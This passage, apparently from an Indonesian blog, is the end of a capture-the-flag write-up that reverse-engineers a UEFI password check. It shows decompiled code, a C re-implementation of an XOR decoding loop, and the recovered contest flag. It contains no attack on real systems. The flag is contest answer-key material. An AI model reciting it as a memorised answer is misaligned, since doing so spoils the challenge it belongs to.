      EFISystemTable<span style="color:#f92672">-&gt;</span>ConOut,
      <span style="color:#f92672">&amp;</span>str_bintang,                             <span style="color:#75715e">// &#34;*&#34;
</span><span style="color:#75715e"></span>      v29,
      v29);
  }
  <span style="color:#66d9ef">while</span> ( HIWORD(v151) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">13</span> );</code></pre></div>
<p>Kalau diteliti lagi bagian ini sebenarnya melakukan,</p>

<pre><code>1. clear screen
2. `printf(&quot;%s&quot;, v118)`, v118 ini bisa jadi string password
3. `ReadKeyStroke(..., &amp;v151, ...` dan menyimpannya ke `v124 + off = v151`, `v124` ini bisa jadi input password
4. setelah input tadi, yang print hanya &quot;*&quot; (simbol bintang)
</code></pre>

<p>dan ini pas banget untuk apa yang dilakukan saat menjalakan filenya dengan qemu setelah memberi input exit pada UEFI shell.</p>

<p>Untuk membuktikan asumsi tadi, coba buat bagian tadi ke C,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">char</span> word_1172C[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">char</span> word_11744[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">3</span>,  <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">240</span>,
                     <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">96</span>,  <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">0</span>};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[]) {
  <span style="color:#66d9ef">char</span> v1[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">char</span> v118[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};

  <span style="color:#66d9ef">int</span> v0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">do</span> {
    <span style="color:#66d9ef">int</span> v24 <span style="color:#f92672">=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
    v118[v0] <span style="color:#f92672">=</span> word_1172C[v0] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
    <span style="color:#66d9ef">do</span> {
      <span style="color:#66d9ef">char</span> v25 <span style="color:#f92672">=</span> word_11744[v24];
      <span style="color:#66d9ef">if</span> (v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>) {
        <span style="color:#66d9ef">if</span> (v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>)
          v25 <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xC1</span>;
        <span style="color:#66d9ef">else</span>
          v25 <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xAB</span>;
      } <span style="color:#66d9ef">else</span> {
        v25 <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x53u</span>;
      }
      v1[v24] <span style="color:#f92672">=</span> v25;
      v1[v24<span style="color:#f92672">++</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x12u</span>;
    } <span style="color:#66d9ef">while</span> (v24 <span style="color:#f92672">!=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
    <span style="color:#f92672">++</span>v0;
  } <span style="color:#66d9ef">while</span> (v0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span>);

  printf(<span style="color:#e6db74">&#34;%s&#34;</span>, v118);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}</code></pre></div>
<p>compile lalau jalankan programnya,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> gcc solve.c <span style="color:#f92672">-</span>o solve
<span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span>solve
Password : </code></pre></div>
<p>Yep, asumsi awal kita benar dengan begitu, <code>v124</code> ini adalah input dari password. Cari xref nya untuk mendapatkan dimana input dicek,
<img src="/img/wreckit-sehnsucht-v124xref.png" alt="v124 xref" /></p>

<p>basic block <code>if</code> ini sebenarnya sudah menandakan tanda bagus kalau <code>v124</code> sedang dicek terhadap variabel lain, plus fungsi <code>sub_902A</code> ini sebenarnya <code>strncmp</code>, berikuta hasil dekompilasinya,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">sub_902A</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>a1, _WORD <span style="color:#f92672">*</span>a2, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a3)
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// edi
</span><span style="color:#75715e"></span>  _WORD <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// edx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// esi
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// eax
</span><span style="color:#75715e"></span>
  v3 <span style="color:#f92672">=</span> a1;
  v4 <span style="color:#f92672">=</span> a2;
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> a3; ; <span style="color:#f92672">--</span>i )
  {
    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v3;
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(_WORD)v6 <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>v4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> (_WORD)v6 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>v4 <span style="color:#f92672">||</span> i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1</span> )
      <span style="color:#66d9ef">break</span>;
    <span style="color:#f92672">++</span>v3;
    <span style="color:#f92672">++</span>v4;
  }
  <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)<span style="color:#f92672">*</span>v4;
}</code></pre></div>
<p>dengan begitu, <code>sub_902A(v124, v1, 0x16u)</code> adalah <code>strncmp(v124, v1, 0x16u)</code>. Kalau lihat lagi ke hasil dekompilasi IDA atau pada <code>solve.c</code>, <code>v1</code> ini diinisialisasi berbarengan dengan string password (<code>v118</code>) dan input dixor dengan 0x12 (<code>*(_WORD *)(v28 - 2) = HIWORD(input_from_readkeystroke_v151) ^ 0x12;</code>),</p>

<p>Jadi, sekarang hanya perlu mengubah <code>solve.c</code> tadi untuk print <code>v1</code> tanpa dixor dengan 0x12 pada akhirnya. Berikut hasilnya,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">short</span> word_1172C[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">char</span> word_11744[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">3</span>,  <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">240</span>,
                     <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">96</span>,  <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">0</span>};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[]) {
  <span style="color:#66d9ef">char</span> v1[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">char</span> v118[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};

  <span style="color:#66d9ef">int</span> v0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#66d9ef">do</span> {
    <span style="color:#66d9ef">int</span> v24 <span style="color:#f92672">=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
    v118[v0] <span style="color:#f92672">=</span> word_1172C[v0] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
    <span style="color:#66d9ef">do</span> {
      <span style="color:#66d9ef">char</span> v25 <span style="color:#f92672">=</span> word_11744[v24];
      <span style="color:#66d9ef">if</span> (v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>) {
        <span style="color:#66d9ef">if</span> (v24 <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>)
          v25 <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xC1</span>;
        <span style="color:#66d9ef">else</span>
          v25 <span style="color:#f92672">=</span> v25 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xAB</span>;
      } <span style="color:#66d9ef">else</span> {
        v25 <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x53u</span>;
      }
      v1[v24<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> v25;
      <span style="color:#75715e">// v1[v24++] ^= 0x12u;
</span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">while</span> (v24 <span style="color:#f92672">!=</span> v0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
    <span style="color:#f92672">++</span>v0;
  } <span style="color:#66d9ef">while</span> (v0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span>);

  printf(<span style="color:#e6db74">&#34;%s&#34;</span>, v1);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}</code></pre></div>
<p><img src="/img/wreckit-sehnsucht-solve.png" alt="solve" />
Flag: <code>wreck{Ea5y_U3f1_t34s3_4_Qua15s}</code></p>


		

<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    if (window.location.hostname == "localhost")
        return;

    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    var disqus_shortname = 'circleous';
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

	</div>

	<div class="pagination">
		<a href="/posts/compfest-11-final-fruity-goodness/" class="left arrow">&#8592;</a>

		<a href="#" class="top">Top</a>
	</div>
</main>


        		<footer>
			<span>
			&copy; <time datetime="2019-09-29 20:21:18.108112278 &#43;0700 WIB m=&#43;0.103970189">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
			</span>
		</footer>

    </body>
</html>
